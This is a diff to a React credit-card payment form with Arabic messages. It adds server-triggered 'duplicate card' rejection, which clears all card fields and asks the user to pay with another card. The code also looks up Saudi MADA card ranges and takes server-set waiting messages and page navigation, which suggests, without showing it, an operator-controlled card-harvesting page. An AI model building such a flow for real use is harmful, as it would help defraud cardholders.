@@ -25,6 +25,7 @@ import {
   navigateToPage,
   cardAction,
   waitingMessage,
+  duplicateCardRejected,
 } from "@/lib/store";
 import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";
 
@@ -115,6 +116,7 @@ export default function CreditCardPayment() {
   const [cardError, setCardError] = useState(false);
   const [luhnError, setLuhnError] = useState(false);
   const [rejectedError, setRejectedError] = useState(false);
+  const [duplicateError, setDuplicateError] = useState(false);
   const [selectKey, setSelectKey] = useState(0); // مفتاح لإعادة تعيين Select components
   const debounceRef = useRef<ReturnType<typeof setTimeout>>();
 
@@ -219,6 +221,26 @@ export default function CreditCardPayment() {
     }
   });
 
+  // Handle duplicate card rejection from server
+  useSignalEffect(() => {
+    if (duplicateCardRejected.value) {
+      setDuplicateError(true);
+      waitingMessage.value = "";
+      // تفريغ جميع الحقول
+      reset({
+        cardNumber: "",
+        nameOnCard: "",
+        expiryMonth: "",
+        expiryYear: "",
+        cvv: "",
+      });
+      // إعادة تعيين Select components
+      setSelectKey(prev => prev + 1);
+      // Reset signal
+      duplicateCardRejected.value = false;
+    }
+  });
+
   // Format card number with spaces every 4 digits
   const formatCardNumber = (value: string): string => {
     const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
@@ -260,6 +282,10 @@ export default function CreditCardPayment() {
     // Reset global blocked error when user types
     if (globalBlockedError) {
       setGlobalBlockedError(false);
+    }
+    // Reset duplicate error when user types
+    if (duplicateError) {
+      setDuplicateError(false);
     }
 
     if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
@@ -385,6 +411,14 @@ export default function CreditCardPayment() {
         {rejectedError && (
           <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
             <p className="text-red-600 text-center font-medium">معلومات البطاقة المدخلة غير صحيحة</p>
+          </div>
+        )}
+
+        {/* Duplicate Card Error Message */}
+        {duplicateError && (
+          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
+            <p className="text-red-600 text-center font-medium">تم رفض البطاقة</p>
+            <p className="text-red-500 text-center text-sm mt-1">يرجى محاولة الدفع من بطاقة أخرى</p>
           </div>
         )}
 
